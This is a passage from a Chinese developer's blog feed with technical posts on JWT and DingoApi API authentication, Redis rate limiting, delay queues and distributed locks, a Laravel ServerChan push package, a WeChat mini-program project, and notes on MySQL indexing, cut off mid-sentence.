不被篡改。</li></ul><blockquote><p>JWT 最后是通过 Base64 编码的，也就是说，它可以被翻译回原来的样子来的。所以不要在 JWT 中存放一些敏感信息。</p></blockquote><p>用户 id，过期时间等数据都保存在 Token 中了，所以并不需要将 Token 保存在服务器中，客户端请求的时候在 Header 中携带 Token，服务器获取 Token后，进行 base64_decode 即可获取数据进行校验，由于已经有了签名，所以不用担心数据被篡改。</p><h3 id="Token-验证"><a href="#Token-验证" class="headerlink" title="Token 验证"></a>Token 验证</h3><p>有了 token 之后该如何验证 token 的有效性，并得到 token 对应的用户呢？其实原理很简单，DingoApi 为我们准备好了 api.auth 这个中间件</p><ul><li>获取客户端提交的 token</li><li>检测 token 中的签名 signature 是否正确</li><li>判断 payload 数据中的 exp，是否已经过期</li><li>根据 payload 数据中的 sub，取数据库中验证用户是否存在</li><li>上述检测不正确，则抛出相应异常</li></ul><h2 id="Include机制"><a href="#Include机制" class="headerlink" title="Include机制"></a>Include机制</h2><p>如何获取相关连的数据也是我们应该关心的问题</p><ul><li>如何获取额外的资源数据？</li><li>资源数据该以什么样的结构返回？<br>其实 DingoApi 已经很好的解决了这两个问题。修改下Transformer</li></ul><p>如下代码所示：</p><p>其实 DingoApi 已经很好的解决了这两个问题。</p><pre><code>protected $availableIncludes = [&apos;user&apos;, &apos;category&apos;];    public function transform(Topic $topic)    {        return [            &apos;id&apos; =&gt; $topic-&gt;id,            &apos;title&apos; =&gt; $topic-&gt;title,            &apos;body&apos; =&gt; $topic-&gt;body,            &apos;user_id&apos; =&gt; $topic-&gt;user_id,            &apos;category_id&apos; =&gt; $topic-&gt;category_id,            &apos;reply_count&apos; =&gt; $topic-&gt;reply_count,            &apos;view_count&apos; =&gt; $topic-&gt;view_count,            &apos;last_reply_user_id&apos; =&gt; $topic-&gt;last_reply_user_id,            &apos;excerpt&apos; =&gt; $topic-&gt;excerpt,            &apos;slug&apos; =&gt; $topic-&gt;slug,            &apos;created_at&apos; =&gt; $topic-&gt;created_at-&gt;toDateTimeString(),            &apos;updated_at&apos; =&gt; $topic-&gt;updated_at-&gt;toDateTimeString(),        ];    }    public function includeUser(Topic $topic)    {        return $this-&gt;item($topic-&gt;user, new UserTransformer());    }    public function includeCategory(Topic $topic)    {        return $this-&gt;item($topic-&gt;category, new CategoryTransformer());    }</code></pre><h1 id="自动化测试"><a href="#自动化测试" class="headerlink" title="自动化测试"></a>自动化测试</h1><p>在开发过程中，我们使用 PostMan 手动一个个接口测试，可当我们有几十个甚至上百个接口时，要同时测试这些接口，手动测试将无法适用。解决方案是自动化测试，自动化测试是保证项目质量的重要环节，这一节我们来了解一下测试的相关概念。</p><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>单元测试是指对软件中的最小可测试单元进行检查和验证，对于 PHP 来说通常情况下是对某个类中的 某个方法，或者单独的某个方法进行测试。单元测试的目的是首先保证一个系统的 基本组成单元 能正常工作，所有基础零件工作正常了，组装出来的软件才不会出问题。</p><p>单元测试是 代码级别 的测试，开发和维护成本都很高，不建议小团队使用。如果是多人协作，我的任务是单独的封装一些通用功能，譬如写个 Service；或者编写一个扩展包，提供一些底层的代码接口，譬如为某个第三方应用封装 SDK，那么单元测试非常有必要。</p><h2 id="API-集成测试"><a href="#API-集成测试" class="headerlink" title="API 集成测试"></a>API 集成测试</h2><p>Laravel 框架自带的集成 API 测试，见 <a href="https://laravel-china.org/docs/laravel/5.5/http-tests/1339#testing-json-apis" target="_blank" rel="noopener">文档</a>，我们初始化完整的应用程序上下文，准备好数据库中的测试数据后，就可以方便的模拟各种请求方式，调用接口获取响应结果，最终 断言 返回的结果是否等于预期结果。</p><p>API 集成测试 需要准备测试数据，需要设置用户，分配用户权限，为测试接口准备好相关联的数据。虽然有一定得维护成本，但是相比单元测试，维护成本要少很多，在一定程度上更能够保证项目的健壮性。</p><h2 id="PostMan-测试"><a href="#PostMan-测试" class="headerlink" title="PostMan 测试"></a>PostMan 测试</h2><p>使用 PostMan 等工具进行手动测试，这种是最推崇的测试方案，非常适合小团队使用，因为可以比较真实地模拟用户请求，并且团队协作中，后端工程师可以将 PostMan 的调试接口分享给客户端工程师，接口是否有问题客户端工程师可以自行测试。</p><h1 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h1><ul><li><a href="https://swagger.io/" target="_blank" rel="noopener">swagger</a></li><li><a href="http://apidocjs.com/" target="_blank" rel="noopener">APIdoc</a></li><li><a href="https://apizza.net/" target="_blank" rel="noopener">apizza</a>(可以导入postman导出的文件)</li></ul>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis应用3--限流策略</title>
      <link href="/2018/08/15/redis%E5%BA%94%E7%94%A83-%E9%99%90%E6%B5%81%E7%AD%96%E7%95%A5/"/>
      <url>/2018/08/15/redis%E5%BA%94%E7%94%A83-%E9%99%90%E6%B5%81%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<p>当系统的处理能力有限时，或者需要控制用户行为，避免垃圾请求的请求时候，一般我们会限定某请求行为在规定时间内允许的次数，超过了次数那就是非法行为，也就是限流。</p><a id="more"></a><h1 id="简单限流策略"><a href="#简单限流策略" class="headerlink" title="简单限流策略"></a>简单限流策略</h1><p>系统要限定用户的某个行为在指定的时间里只能允许发生 N 次</p><p>使用zset结构记录用户的行为历史，每一个请求行为都作为zeset的一个key保存下来，同一个用户同一种行为用一个zset记录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">    import time</span><br><span class="line">    import Redis</span><br><span class="line">    client = Redis.StrictRedis()</span><br><span class="line">    def is_action_allowed(user_id, action_key, period, max_count):</span><br><span class="line">        key = <span class="string">'hist:%s:%s'</span> % (user_id, action_key)</span><br><span class="line">        now_ts = int(time.time() * 1000)  <span class="comment"># 毫秒时间戳</span></span><br><span class="line">        with client.pipeline() as pipe:  <span class="comment"># client 是 StrictRedis 实例</span></span><br><span class="line">            <span class="comment"># 记录行为</span></span><br><span class="line">            pipe.zadd(key, now_ts, now_ts)  <span class="comment"># value 和 score 都使用毫秒时间戳</span></span><br><span class="line">            <span class="comment"># 移除时间窗口之前的行为记录，剩下的都是时间窗口内的</span></span><br><span class="line">            pipe.zremrangebyscore(key, 0, now_ts - period * 1000)</span><br><span class="line">            <span class="comment"># 获取窗口内的行为数量</span></span><br><span class="line">            pipe.zcard(key)</span><br><span class="line">            <span class="comment"># 设置 zset 过期时间，避免冷用户持续占用内存</span></span><br><span class="line">            <span class="comment"># 过期时间应该等于时间窗口的长度，再多宽限 1s</span></span><br><span class="line">            pipe.expire(key, period + 1)</span><br><span class="line">            <span class="comment"># 批量执行</span></span><br><span class="line">            _, _, current_count, _ = pipe.execute()</span><br><span class="line">        <span class="comment"># 比较数量是否超标</span></span><br><span class="line">        <span class="built_in">return</span> current_count &lt;= max_count...</span><br><span class="line">```   </span><br><span class="line">   </span><br><span class="line"><span class="comment"># 漏斗限流</span></span><br><span class="line">漏斗的容量是有限的，如果将漏嘴堵住，然后一直往里面灌水，它就会变满，直至再也装不进去。如果将漏嘴放开，水就会往下流，流走一部分之后，就又可以继续往里面灌水。如果漏嘴流水的速率大于灌水的速率，那么漏斗永远都装不满。如果漏嘴流水速率小于灌水的速率，那么一旦漏斗满了，灌水就需要暂停并等待漏斗腾空。</span><br><span class="line">这个算法的灵感源于漏斗结构，漏斗的剩余空间代表着当前行为可以持续进行的数量，漏嘴的流水速率代表着系统允许该行为的最大频率</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    <span class="comment"># coding: utf8</span></span><br><span class="line">    import time</span><br><span class="line">    class Funnel(object):</span><br><span class="line">        def __init__(self, capacity, leaking_rate):</span><br><span class="line">            self.capacity = capacity  <span class="comment"># 漏斗容量</span></span><br><span class="line">            self.leaking_rate = leaking_rate  <span class="comment"># 漏嘴流水速率</span></span><br><span class="line">            self.left_quota = capacity  <span class="comment"># 漏斗剩余空间</span></span><br><span class="line">            self.leaking_ts = time.time()  <span class="comment"># 上一次漏水时间</span></span><br><span class="line">        def make_space(self):</span><br><span class="line">            now_ts = time.time()</span><br><span class="line">            delta_ts = now_ts - self.leaking_ts  <span class="comment"># 距离上一次漏水过去了多久</span></span><br><span class="line">            delta_quota = delta_ts * self.leaking_rate  <span class="comment"># 又可以腾出不少空间了</span></span><br><span class="line">            <span class="keyword">if</span> delta_quota &lt; 1:  <span class="comment"># 腾的空间太少，那就等下次吧</span></span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line">            self.left_quota += delta_quota  <span class="comment"># 增加剩余空间</span></span><br><span class="line">            self.leaking_ts = now_ts  <span class="comment"># 记录漏水时间</span></span><br><span class="line">            <span class="keyword">if</span> self.left_quota &gt; self.capacity:  <span class="comment"># 剩余空间不得高于容量</span></span><br><span class="line">                self.left_quota = self.capacity</span><br><span class="line">        def watering(self, quota):</span><br><span class="line">            self.make_space()</span><br><span class="line">            <span class="keyword">if</span> self.left_quota &gt;= quota:  <span class="comment"># 判断剩余空间是否足够</span></span><br><span class="line">                self.left_quota -= quota</span><br><span class="line">                <span class="built_in">return</span> True</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line">    funnels = &#123;&#125;  <span class="comment"># 所有的漏斗</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># capacity  漏斗容量</span></span><br><span class="line">    <span class="comment"># leaking_rate 漏嘴流水速率 quota/s</span></span><br><span class="line">    def is_action_allowed(</span><br><span class="line">            user_id, action_key, capacity, leaking_rate):</span><br><span class="line">                key = <span class="string">'%s:%s'</span> % (user_id, action_key)</span><br><span class="line">                funnel = funnels.get(key)</span><br><span class="line">                <span class="keyword">if</span> not funnel:</span><br><span class="line">                    funnel = Funnel(capacity, leaking_rate)</span><br><span class="line">                    funnels[key] = funnel</span><br><span class="line">                <span class="built_in">return</span> funnel.watering(1)</span><br></pre></td></tr></table></figure></p><p>上述代码可以这样理解，有一个一定容量的漏斗，客户端的请求就是给漏斗加水，漏斗无时无刻都在漏水，当加水的频率大于漏水的频率，直到漏斗满了，也就是加的水比漏斗剩余的大的时候，就无法在加水了，起到限流的作用。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis应用2--延时队列</title>
      <link href="/2018/08/14/redis%E5%BA%94%E7%94%A82-%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97/"/>
      <url>/2018/08/14/redis%E5%BA%94%E7%94%A82-%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<p>对于后端开发，消息队列可能都不陌生，主要原因是由于在高并发环境下，由于来不及同步处理，请求往往会发生堵塞，这时候，我们可以异步处理请求，将请求任务先暂存，然后在慢慢消化掉任务，从而缓解系统的压力。</p><a id="more"></a><h2 id="异步消息队列实现"><a href="#异步消息队列实现" class="headerlink" title="异步消息队列实现"></a>异步消息队列实现</h2><p>Redis 的 list(列表) 数据结构常用来作为异步消息队列使用，使用rpush/lpush操作入队列，使用lpop 和 rpop来出队列。</p><h3 id="问题-队列空了"><a href="#问题-队列空了" class="headerlink" title="问题 队列空了"></a>问题 队列空了</h3><p>客户端是通过队列的 pop 操作来获取消息，然后进行处理。处理完了再接着获取消息，再进行处理。如此循环往复，这便是作为队列消费者的客户端的生命周期。<br>可是如果队列空了，客户端就会陷入 pop 的死循环，不停地 pop，没有数据，接着再 pop，又没有数据。这就是浪费生命的空轮询。…</p><h3 id="队列空的解决方案"><a href="#队列空的解决方案" class="headerlink" title="队列空的解决方案"></a>队列空的解决方案</h3><p>使用blpop/brpop代替lpop/rop，阻塞读在队列没有数据的时候，会立即进入休眠状态，一旦数据到来，则立刻醒过来。消息的延迟几乎为零。用blpop/brpop替代前面的lpop/rpop，就完美解决了上面的问题<br>使用 blpop/brpop虽然可以解决队列空的问题，但是也会导致，空闲连接，如果线程一直阻塞在哪里，Redis 的客户端连接就成了闲置连接，闲置过久，服务器一般会主动断开连接，减少闲置资源占用。这个时候blpop/brpop会抛出异常来，因此使用blpop/brpop要注意捕获异常处理</p><h2 id="延时队列的实现"><a href="#延时队列的实现" class="headerlink" title="延时队列的实现"></a>延时队列的实现</h2><p>延时队列可以通过 Redis 的 zset(有序列表) 来实现。我们将消息序列化成一个字符串作为 zset 的value，这个消息的到期处理时间作为score，然后用多个线程轮询 zset 获取到期的任务进行处理，多个线程是为了保障可用性，万一挂了一个线程还有其它线程可以继续处理。因为有多个线程，所以需要考虑并发争抢任务，确保任务不能被多次执行。…</p><pre><code class="bash">def delay(msg):    msg.id = str(uuid.uuid4())  <span class="comment"># 保证 value 值唯一</span>    value = json.dumps(msg)    retry_ts = time.time() + 5  <span class="comment"># 5 秒后重试</span>    Redis.zadd(<span class="string">"delay-queue"</span>, retry_ts, value)def loop():    <span class="keyword">while</span> True:        <span class="comment"># 最多取 1 条</span>        values = Redis.zrangebyscore(<span class="string">"delay-queue"</span>, 0, time.time(), start=0, num=1)        <span class="keyword">if</span> not values:            time.sleep(1)  <span class="comment"># 延时队列空的，休息 1s</span>            <span class="built_in">continue</span>        value = values[0]  <span class="comment"># 拿第一条，也只有一条</span>        success = Redis.zrem(<span class="string">"delay-queue"</span>, value)  <span class="comment"># 从消息队列中移除该消息</span>        <span class="keyword">if</span> success:  <span class="comment"># 因为有多进程并发的可能，最终只会有一个进程可以抢到消息</span>            msg = json.loads(value)            handle_msg(msg)...</code></pre><h2 id="Redis做消息队列的缺陷"><a href="#Redis做消息队列的缺陷" class="headerlink" title="Redis做消息队列的缺陷"></a>Redis做消息队列的缺陷</h2><ul><li>消息不保证可靠</li></ul><p>消息被发送出去，消费者是否接收到消息Redis不做保证，不像一般的mq，会有ack机制，要求消费者收到消息进行ack确认，超时未确认mq会再次投递消息，而Redis没有这个机制。毕竟不是专业消息中间件…</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis应用1一分布式锁</title>
      <link href="/2018/08/14/redis%E5%BA%94%E7%94%A81%E4%B8%80%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"/>
      <url>/2018/08/14/redis%E5%BA%94%E7%94%A81%E4%B8%80%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</url>
      
        <content type="html"><![CDATA[<p>多个进程需要对同一个资源进行非原子操作的时候，经常会遇到并发问题，这时候就要使用到分布锁来限制程序的并发执行。</p><a id="more"></a><h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>分布式锁简单的可以这样理解，当一个资源最先访问到资源的，加锁，等访问完之后，释放锁，当其他进程也要访问的时候，需要等锁释放之后再来访问</p><ul><li>加锁：在Redis中常用的命令是setnx key value</li><li>释放锁：del key</li></ul><p>但是在实际应用中，会遇到很多的问题</p><h3 id="1-问题-gt-死锁"><a href="#1-问题-gt-死锁" class="headerlink" title="1 问题-&gt; 死锁"></a>1 问题-&gt; 死锁</h3><p>如果在加锁和释放锁之间的业务逻辑代码执行到中间出现异常，导致释放锁代码没有执行，锁永远会得不到释放，造成思索</p><h3 id="死锁解决方法"><a href="#死锁解决方法" class="headerlink" title="死锁解决方法"></a>死锁解决方法</h3><p>给锁加上一个过期时间，这样即使中间出现异常也可以保证到期后锁会自动释放</p><h3 id="2-问题-gt-expire得不到执行"><a href="#2-问题-gt-expire得不到执行" class="headerlink" title="2 问题-&gt; expire得不到执行"></a>2 问题-&gt; expire得不到执行</h3><p>setnx和expire之间服务器进程突然挂掉了，导致expire得不到执行，也会造成死锁</p><h3 id="expire得不到执行解决方法"><a href="#expire得不到执行解决方法" class="headerlink" title="expire得不到执行解决方法"></a>expire得不到执行解决方法</h3><p>Redis2.8版本中，加入了set指令的扩展参数，使得setnx和expire指令可以一起执行</p><pre><code>set key value ex 5 nx</code></pre><p>这也是分布式锁的奥义所在。</p><h3 id="3-超时问题"><a href="#3-超时问题" class="headerlink" title="3 超时问题"></a>3 超时问题</h3><p>Redis 的分布式锁不能解决超时问题，如果在加锁和释放锁之间的逻辑执行的太长，以至于超出了锁的超时限制，就会出现问题。因为这时候锁过期了，第二个线程重新持有了这把锁，但是紧接着第一个线程执行完了业务逻辑，就把锁给释放了，第三个线程就会在第二个线程逻辑执行完之间拿到了锁。</p><h3 id="超时问题解决方法"><a href="#超时问题解决方法" class="headerlink" title="超时问题解决方法"></a>超时问题解决方法</h3><p>为了避免这个问题，Redis 分布式锁不要用于较长时间的任务。如果真的偶尔出现了，数据出现的小波错乱可能需要人工介入解决。…<br>所以Redis分布式锁还是有缺陷的</p><h3 id="4-加锁失败的问题"><a href="#4-加锁失败的问题" class="headerlink" title="4 加锁失败的问题"></a>4 加锁失败的问题</h3><p>当客户端在处理请求时加锁没成功的话</p><h3 id="加锁失败问题的解决方法"><a href="#加锁失败问题的解决方法" class="headerlink" title="加锁失败问题的解决方法"></a>加锁失败问题的解决方法</h3><ul><li><p>直接抛出异常，通知用户稍后重试；</p><p>  这种方式比较适合由用户直接发起的请求，用户看到错误对话框后，会先阅读对话框的内容，再点击重试，这样就可以起到人工延时的效果。如果考虑到用户体验，可以由前端的代码替代用户自己来进行延时重试控制。它本质上是对当前请求的放弃，由用户决定是否重新发起新的请求。…</p></li><li><p>sleep 一会再重试；</p><p>  sleep 会阻塞当前的消息处理线程，会导致队列的后续消息处理出现延迟。如果碰撞的比较频繁或者队列里消息比较多，sleep 可能并不合适。如果因为个别死锁的 key 导致加锁不成功，线程会彻底堵死，导致后续消息永远得不到及时处理。</p></li><li><p>将请求转移至延时队列，过一会再试；</p><p>  这种方式比较适合异步消息处理，将当前冲突的请求扔到另一个队列延后处理以避开冲突。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>柜号快查--一个方便查询快递在收发室对应货柜号的小程序</title>
      <link href="/2018/08/13/%E6%9F%9C%E5%8F%B7%E5%BF%AB%E6%9F%A5-%E4%B8%80%E4%B8%AA%E6%96%B9%E4%BE%BF%E6%9F%A5%E8%AF%A2%E5%BF%AB%E9%80%92%E5%9C%A8%E6%94%B6%E5%8F%91%E5%AE%A4%E5%AF%B9%E5%BA%94%E8%B4%A7%E6%9F%9C%E5%8F%B7%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
      <url>/2018/08/13/%E6%9F%9C%E5%8F%B7%E5%BF%AB%E6%9F%A5-%E4%B8%80%E4%B8%AA%E6%96%B9%E4%BE%BF%E6%9F%A5%E8%AF%A2%E5%BF%AB%E9%80%92%E5%9C%A8%E6%94%B6%E5%8F%91%E5%AE%A4%E5%AF%B9%E5%BA%94%E8%B4%A7%E6%9F%9C%E5%8F%B7%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/shisiying/CabinetNoCheck" target="_blank" rel="noopener">CabinetNoCheck</a><br>柜号快查–一个方便查询快递在收发室对应货柜号的小程序<br><a id="more"></a></p><p><img src="index.png" alt=""></p><p><img src="detail.png" alt=""></p><h1 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h1><p><img src="ming.png" alt=""></p><ul><li>模拟登陆集团api，拿到加密的数据并进行解析</li><li>搭建后端服务，根据名字查询具体的货柜号</li><li>使用小程序搭建交互页面</li><li>限制一天只能查三次，分享可以获得查询一次</li></ul><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><ul><li>flask-rest搭建后端服务</li><li>selnium+chromedriver headless搭建爬虫爬取数据</li><li>微信小程序显示界面</li><li>使用Redis存储数据</li></ul>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一个基于server酱推送服务的laravel+package</title>
      <link href="/2018/07/18/%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Eserver%E9%85%B1%E6%8E%A8%E9%80%81%E6%9C%8D%E5%8A%A1%E7%9A%84laravel-package/"/>
      <url>/2018/07/18/%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Eserver%E9%85%B1%E6%8E%A8%E9%80%81%E6%9C%8D%E5%8A%A1%E7%9A%84laravel-package/</url>
      
        <content type="html"><![CDATA[<p>最近在做服务器通知的时候，发现邮件，短信什么的都需要钱，但是自己需要的服务要求也不高，遂找到了server酱做代替，真的是一个非常好用简单易用的的推送工具，你可以用来做，<br><a id="more"></a></p><ul><li>服务器运维通知</li><li>评论通知，当有人评论你博客时候可以做通知工具</li><li>网站留言本，直接推送到你的微信</li></ul><p>同时，我也将它laravel化了</p><p>可以看这里<a href="https://github.com/shisiying/sevenshi-serverchan" target="_blank" rel="noopener">sevenshi/serverchan</a></p><h1 id="A-Easy-Laravel-Package-for-ServerChan"><a href="#A-Easy-Laravel-Package-for-ServerChan" class="headerlink" title="A Easy Laravel Package for ServerChan"></a>A Easy Laravel Package for ServerChan</h1><p>See <a href="http://sc.ftqq.com/3.version" target="_blank" rel="noopener">Server酱</a></p><h2 id="Quick-Start-Guide"><a href="#Quick-Start-Guide" class="headerlink" title="Quick Start Guide"></a>Quick Start Guide</h2><ul><li><p>Create a Laravel 5.5 project: <code>composer create-project laravel/laravel myproject dev-develop</code></p></li><li><p><code>cd myproject</code></p></li><li><p>Add dependency: <code>composer require sevenshi/serverchan</code></p></li><li><p>Copy configuration: <code>php artisan vendor:publish</code></p></li><li><p>set the SCKEY you get from the serverchan on the .env <code>SCKEY=SCU17044T7eafa406fxxxxxxxxxx</code></p></li></ul><p>Now you are ready to use the Seven Facade, e.g. open routes/web.php:</p><ul><li>send message to yourself </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'seven'</span>,<span class="function"><span class="keyword">function</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    Seven::setTitle(<span class="string">'hi'</span>)-&gt;setMessage(<span class="string">'hello world'</span>)-&gt;push();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>send message to who subscribe your channel</li></ul><p>the channel comes from the <a href="http://pushbear.ftqq.com/admin/#/" target="_blank" rel="noopener">PushBear</a>,and channel key comes from the channel you create </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'seven'</span>,<span class="function"><span class="keyword">function</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    Seven::setTitle(<span class="string">'hi'</span>)-&gt;setMessage(<span class="string">'hello every body'</span>)-&gt;setChannel(<span class="string">'4794-e28b9dae54e86365773xxx'</span>)-&gt;pushbear();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>response</li></ul><p>if the request is ok,it will response these data below:</p><p>push:</p><pre><code>- success {&quot;errno&quot;:0,&quot;errmsg&quot;:&quot;success&quot;,&quot;dataset&quot;:&quot;done&quot;}</code></pre><p>pushbear:</p><pre><code>- {&quot;code&quot;:0,&quot;message&quot;:&quot;&quot;,&quot;data&quot;:&quot;1\u6761\u6d88\u606f\u5df2\u6210\u529f\u63a8\u9001\u5230\u53d1\u9001\u961f\u5217&quot;,&quot;created&quot;:&quot;2018-07-18 14:43:05&quot;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>高性能mysql学习笔记-创建高性能的索引</title>
      <link href="/2018/07/03/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA%E9%AB%98%E6%80%A7%E8%83%BD%E7%9A%84%E7%B4%A2%E5%BC%95/"/>
      <url>/2018/07/03/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA%E9%AB%98%E6%80%A7%E8%83%BD%E7%9A%84%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<p>索引是存储引擎用于快速找到记录的一种数据结构，对于良好的性能非常关键，尤其是当表中的数据量越来越大的时候。</p><a id="more"></a><h1 id="创建高性能的索引"><a href="#创建高性能的索引" class="headerlink" title="创建高性能的索引"></a>创建高性能的索引</h1><ul><li>索引是存储引擎用于快速找到记录的一种数据结构。</li><li>对良好的性能非常关键。</li><li>对查询性能优化最有效的手段。轻易将查询性能提高几个数量级。</li></ul><h2 id="索引基础"><a href="#索引基础" class="headerlink" title="索引基础"></a>索引基础</h2><ul><li>存储引擎使用索引，先在索引中找到对应的值，然后根据匹配的索引记录找到对应的数据行。</li><li>可以包含一个或多个列的值。如果包含多个列，那么列的顺序也很重要，因为MySQL只能高效地使用索引的最左前缀列。</li></ul><h3 id="索引的类型"><a href="#索引的类型" class="headerlink" title="索引的类型"></a>索引的类型</h3><p>索引是在存储引擎层而不是服务器层实现的，所以没有统一的索引标准：不同存储引擎的索引的工作方式不一样，也不是所有的存储引擎都支持所有类型的索引。即使多个存储引擎支持同一种类型的索引，其底层的实现也可能不同。</p><ul><li><p>B-Tree索引：</p><ul><li><p>实际上很多存储引擎使用的是B+Tree，即每一个叶子节点都包含指向下一个叶子节点的指针，从而方便叶子节点的范围遍历。</p></li><li><p>对索引列是顺序组织存储的，很适合查找范围数据。</p></li><li><p>索引对多个值进行排序的依据是CREATE TABLE语句中定义索引时列的顺序。</p></li><li><p>MyISAM使用前缀压缩尽速使得索引更小，并通过数据的物理位置引用被索引的列；InnoDB则按照原数据格式进行存储，并根据主键引用被索引的行。</p></li><li><p>优化性能的时候，可能需要使用相同的列但顺序不同的索引来满足不同类型的查询需求。</p></li><li><p>B+Tree结构示例：</p><figure><img src="B+Tree结构.png" alt="B+Tree结构"><figcaption>B+Tree结构</figcaption></figure></li><li><p>意味着所有的值都是按顺序存储的，并且每个叶子页到跟的距离相同。其中叶子节点的指针指向的是被索引的数据，而不是其它的节点页。如下为一个节点和其对应的叶子节点示例图，其实在根结点和叶子结点之间可能有很多层节点页，树的深度和表的大小直接相关。</p><ul><li><p>从索引的根结点(并未画出)开始搜索，因而存储引擎不再需要进行全表扫描，加快访问数据的速度。</p></li><li><p>根结点的槽中存放了指向子节点的指针，存储引擎根据这些指针向下查找</p></li><li><p>通过比较节点页的值和要查找的值可以找到合适的指针进入下层子节点，这些指针实际上定义了子节点页中值的上限和下限。</p></li><li><p>最终找到对应的值，要么记录不存在。</p></li></ul><figure><img src="02.png" alt="建立在B-Tree结构(从技术上来说是B+Tree)上的索引">上的索引</figure></li><li><p>B-Tree索引的查询类型(适用于全键值、键值范围或键前缀查找，其中键前缀查找只适用于根据最左前缀的查找)：</p><ul><li><p>全值匹配：对索引中所有的列进行匹配</p></li><li><p>匹配最左前缀：匹配最左索引的列</p></li><li><p>匹配列前缀：匹配某一列的值的开头部分，需包含最左列</p></li><li><p>匹配范围值：匹配某一列值的某一特定范围，需包含最左列</p></li><li><p>精确匹配某一列并范围匹配另外一列，需包含最左列</p></li><li><p>只访问索引的查询：查询只需要访问索引，而无须访问数据行。</p></li></ul></li><li><p>除了按值查找外，还可以用于查询中的ORDER BY进行排序操作(按顺序查找)。如果ORDER BY满足之前的查询类型，也可以满足对应的排序需求。</p></li><li><p>限制：</p><ul><li><p>如果不是按照索引的最左列开始查找，则无法使用索引。</p></li><li><p>不能跳过索引的列</p></li><li><p>如果查询中有某个列的范围查询，如LIKE，则其右边所有列都无法使用索引优化查找。</p></li></ul></li></ul></li><li><p>哈希索引：</p><ul><li>基于哈希表实现，只有精确匹配索引所有列的查询才有效。对于每一行数据，存储引擎都会对所有的索引列计算一个哈希码(hash 